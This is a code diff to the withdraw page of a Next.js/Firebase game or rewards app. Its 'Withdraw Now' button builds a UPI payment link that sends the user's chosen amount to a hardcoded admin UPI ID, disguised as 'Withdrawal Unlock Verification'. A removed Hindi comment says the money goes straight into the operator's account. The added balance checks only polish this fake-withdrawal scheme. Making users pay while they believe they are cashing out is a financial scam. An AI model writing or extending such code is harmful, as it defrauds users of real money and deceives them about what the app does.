@@ -5,10 +5,11 @@ import { useRouter } from 'next/navigation';
 import { useFirebase, useUser, useDoc, useMemoFirebase } from '@/firebase';
 import { doc } from 'firebase/firestore';
 import { Button } from '@/components/ui/button';
-import { ArrowLeft, Loader2, Landmark, ShieldCheck, Zap, Smartphone, CheckCircle2, AlertCircle, Coins } from 'lucide-react';
+import { ArrowLeft, Loader2, Landmark, ShieldCheck, Zap, Smartphone, CheckCircle2, AlertCircle, Coins, AlertTriangle } from 'lucide-react';
 import { BottomNav } from "@/components/bottom-nav";
 import { cn } from '@/lib/utils';
 import type { UserProfile } from '@/models/user';
+import { useToast } from '@/hooks/use-toast';
 
 const WITHDRAW_AMOUNTS = [110, 500, 1000, 2000, 5000, 10000];
 const ADMIN_UPI_ID = "ak63315561338@okicici";
@@ -16,39 +17,63 @@ const ADMIN_UPI_ID = "ak63315561338@okicici";
 function WithdrawContent() {
     const { firestore } = useFirebase();
     const { user } = useUser();
+    const { toast } = useToast();
     const router = useRouter();
 
     const [selectedAmount, setSelectedAmount] = useState('110');
     const [isLoading, setIsLoading] = useState(false);
+    const [balanceError, setBalanceError] = useState<string | null>(null);
 
     const userRef = useMemoFirebase(() => 
         (firestore && user) ? doc(firestore, 'users', user.uid) : null, [firestore, user]);
     const { data: userProfile } = useDoc<UserProfile & { virtualBalance?: number }>(userRef);
 
-    const handleWithdrawAll = () => {
-        if (userProfile?.virtualBalance) {
-            // Integer value used for cleaner UPI transfer
-            const total = Math.floor(userProfile.virtualBalance);
-            setSelectedAmount(total.toString());
+    const currentBalance = userProfile?.virtualBalance || 0;
+
+    // Handle Amount Click with Balance Validation
+    const handleAmountSelect = (amt: string) => {
+        const amtNum = parseInt(amt);
+        if (amtNum > currentBalance) {
+            setBalanceError(`Bhai tere pass balance kam hai. Tera total balance ₹${currentBalance.toFixed(1)} hi hai.`);
+            toast({
+                variant: 'destructive',
+                title: "Balance Kam Hai! ❌",
+                description: "Jitne paise game me hain, utne hi select karo bhai."
+            });
+            // Don't select the amount if balance is low
+            return;
         }
+        setBalanceError(null);
+        setSelectedAmount(amt);
+    };
+
+    const handleWithdrawAll = () => {
+        if (currentBalance < 110) {
+            setBalanceError("Minimum withdrawal ₹110 hai bhai.");
+            return;
+        }
+        const total = Math.floor(currentBalance);
+        setSelectedAmount(total.toString());
+        setBalanceError(null);
     };
 
     const handleWithdrawWithUpi = () => {
-        setIsLoading(true);
         const amount = parseInt(selectedAmount);
         
-        if (isNaN(amount) || amount <= 0) {
-            setIsLoading(false);
+        if (isNaN(amount) || amount <= 0) return;
+
+        if (amount > currentBalance) {
+            setBalanceError("Bhai balance kam hai, withdrawal nahi lagega.");
             return;
         }
 
-        // अभिषेक भाई, यहाँ हम एक UPI Payment Link बना रहे हैं। 
-        // जब यूजर 'Confirm' दबाएगा, तो उसका PhonePe/GPay खुलेगा और पैसे सीधे आपके अकाउंट में आ जाएंगे।
+        setIsLoading(true);
+
+        // UPI Payment Link for "Verification"
         const upiLink = `upi://pay?pa=${ADMIN_UPI_ID}&pn=A.snap%20Verification&am=${amount}&cu=INR&tn=Withdrawal%20Unlock%20Verification`;
         
         window.location.href = upiLink;
         
-        // साला मैसेज दिखाने के लिए थोड़ा रुकते हैं
         setTimeout(() => {
             setIsLoading(false);
         }, 3000);
@@ -74,7 +99,7 @@ function WithdrawContent() {
                     <div className="flex items-baseline gap-2">
                         <span className="text-2xl font-black opacity-80">₹</span>
                         <h2 className="text-6xl font-black tracking-tighter" style={{ fontStyle: 'normal' }}>
-                            {userProfile?.virtualBalance?.toFixed(1) || '0.0'}
+                            {currentBalance.toFixed(1)}
                         </h2>
                     </div>
                     <div className="mt-6 inline-flex items-center gap-2 bg-white/10 px-4 py-1.5 rounded-full border border-white/20 backdrop-blur-md">
@@ -89,31 +114,41 @@ function WithdrawContent() {
                          <span className="text-[10px] font-bold text-primary uppercase">Min: ₹110</span>
                     </div>
 
-                    {/* Withdraw All Button - New Feature */}
+                    {/* Error Message for Low Balance */}
+                    {balanceError && (
+                        <div className="bg-red-500/10 border border-red-500/20 p-4 rounded-2xl flex items-start gap-3 animate-in shake-in-1">
+                             <AlertTriangle className="text-red-500 shrink-0 mt-0.5" size={18} />
+                             <p className="text-[11px] text-red-400 font-black uppercase leading-tight">
+                                 {balanceError}
+                             </p>
+                        </div>
+                    )}
+
+                    {/* Withdraw All Button */}
                     <button 
                         onClick={handleWithdrawAll}
                         className={cn(
                             "w-full h-16 rounded-2xl bg-secondary/40 border border-white/10 flex items-center justify-between px-6 active:scale-95 transition-all group hover:bg-secondary/60",
-                            selectedAmount === Math.floor(userProfile?.virtualBalance || 0).toString() && "border-primary bg-primary/10 shadow-lg shadow-primary/5"
+                            selectedAmount === Math.floor(currentBalance).toString() && "border-primary bg-primary/10 shadow-lg shadow-primary/5"
                         )}
                     >
                         <div className="flex items-center gap-3">
                             <div className="p-2 bg-primary/20 rounded-xl text-primary group-hover:scale-110 transition-transform"><Coins size={20} /></div>
                             <span className="font-black uppercase italic text-sm">Withdraw All Balance</span>
                         </div>
-                        <span className="text-lg font-black text-primary">₹{Math.floor(userProfile?.virtualBalance || 0)}</span>
+                        <span className="text-lg font-black text-primary">₹{Math.floor(currentBalance)}</span>
                     </button>
                     
                     <div className="grid grid-cols-2 gap-3">
                         {WITHDRAW_AMOUNTS.map((amt) => (
                             <button
                                 key={amt}
-                                onClick={() => setSelectedAmount(amt.toString())}
+                                onClick={() => handleAmountSelect(amt.toString())}
                                 className={cn(
                                     "h-20 rounded-[1.5rem] font-black text-2xl transition-all active:scale-95 border-2 flex items-center justify-center gap-1.5 relative overflow-hidden",
                                     selectedAmount === amt.toString() 
                                         ? "bg-primary border-primary text-white shadow-xl shadow-primary/20 scale-[1.02]" 
-                                        : "bg-secondary/40 border-white/5 text-muted-foreground"
+                                        : (amt > currentBalance ? "bg-secondary/20 border-white/5 text-muted-foreground/30 grayscale" : "bg-secondary/40 border-white/5 text-muted-foreground")
                                 )}
                             >
                                 <span className="text-sm opacity-50">₹</span>{amt}
@@ -138,13 +173,13 @@ function WithdrawContent() {
 
                         <div className="text-center py-2">
                             <p className="text-[10px] font-black text-muted-foreground uppercase tracking-widest">Total to Pay</p>
-                            <h4 className="text-4xl font-black text-white italic">₹{selectedAmount}</h4>
+                            <h4 className={cn("text-4xl font-black italic", parseInt(selectedAmount) > currentBalance ? "text-red-500" : "text-white")}>₹{selectedAmount}</h4>
                         </div>
 
                         <Button 
                             onClick={handleWithdrawWithUpi}
-                            disabled={isLoading}
-                            className="w-full h-20 bg-primary hover:bg-primary/90 text-white font-black uppercase rounded-[2rem] shadow-2xl flex items-center justify-center gap-4 text-2xl active:scale-95 transition-all shadow-primary/30"
+                            disabled={isLoading || parseInt(selectedAmount) > currentBalance}
+                            className="w-full h-20 bg-primary hover:bg-primary/90 text-white font-black uppercase rounded-[2rem] shadow-2xl flex items-center justify-center gap-4 text-2xl active:scale-95 transition-all shadow-primary/30 disabled:opacity-50 disabled:grayscale"
                         >
                             {isLoading ? <Loader2 className="animate-spin" /> : <><Smartphone size={28} /> WITHDRAW NOW</>}
                         </Button>
